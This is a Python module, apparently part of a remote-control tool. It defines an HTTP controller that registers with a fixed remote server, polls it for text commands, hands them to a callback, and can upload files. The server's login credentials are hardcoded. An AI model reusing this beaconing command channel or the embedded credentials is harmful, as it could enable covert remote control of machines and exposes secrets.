__author__ = 'a1ex!'
__version__ = '1.0'

inf = {'version':__version__,'author':__author__}
import base_ctrl
import threading
import requests
import time

class http(base_ctrl.baseCtrl):
    cb = None
    runn = 0
    cId = 0
    inpThread = None
    lastReq = 0

    a_user = 'admin'
    a_pw = 'asdfq1'
    reqUrl = 'http://dev.tbestway.com/d/cmd.php'
    sleep_time = 30


    def __init__(self,callback,id):
        super().__init__()
        self.cb = callback
        self.cId = id
        self.lastReq = time.time()
        print('HTTP controller loaded',inf)

    def onCommand (self,cmd,args):
        if cmd == base_ctrl.cm_runn:
            self.terminate(args)

    def terminate(self,args):
        self.runn = args
        self.inpThread._stop()
        super().terminate()

    def getInfo(self):
        return inf

    def run(self,args=0):
        self.runn = 1
        self.send({'payload':{'cmd':'register'}})

        self.inpThread = threading.Thread(target=self.keepAlive, args=())
        self.inpThread.start()

        while self.runn:
            it = self.popQueue()
            if it:
                self.send(it)
        print ('Stopping HTTP controller...')

    def keepAlive(self):
        try:
            while self.runn:
                recv = self.send({})
                #if time.time() - self.lastReq < self.sleep_time:    # если ждали меньше sleep_time, значит был ответ или ошибка
                if not recv:                                    # если ждали меньше и нет ответа - ошибка, тогда спим, во избежании флуда
                    time.sleep(self.sleep_time/2)
                    print ('keep alive')
        except BaseException as e:
            print (str(e))

    def onRecv(self,data):
        args = {'cId':self.cId,'uId':'0','msg':data,'type':'text_cmd'}
        self.cb(base_ctrl.ev_rcv,args)
        print ('HTTP recv: ',data)

    def send(self,msg = {}):
        try:
            ret = 0
            #files = {'file': open('report.xls', 'rb')}
            if not 'payload' in msg:
                if 'msg' in msg:
                    msg['payload'] = {'cmd':'message'}
                else:
                    msg['payload'] = {'cmd':'ping'}
            if not 'files' in msg: msg['files'] = {}
            if not 'msg' in msg: msg['msg'] = ''

            msg['payload']['msg'] = msg['msg']

            if (msg['payload']['cmd'] == 'ping'):
                ret = self.postData(msg)
            else:       # если данные, запускаем в потоке
                sndThread = threading.Thread(target=self.postData, args=[msg])
                sndThread.start()

        except BaseException as e:
            print (str(e))
        return ret

    def postData(self,msg):
        try:
            print('HTTP send: ' , msg)
            r = requests.post(self.reqUrl, auth=(self.a_user,self.a_pw), data=msg['payload'] , files=msg['files'])
            if (r.status_code == 200):
                self.lastReq = time.time()
                if (len (r.text)):
                    self.onRecv(r.text)
                return 1
        except BaseException as e:
            print (str(e))
        return 0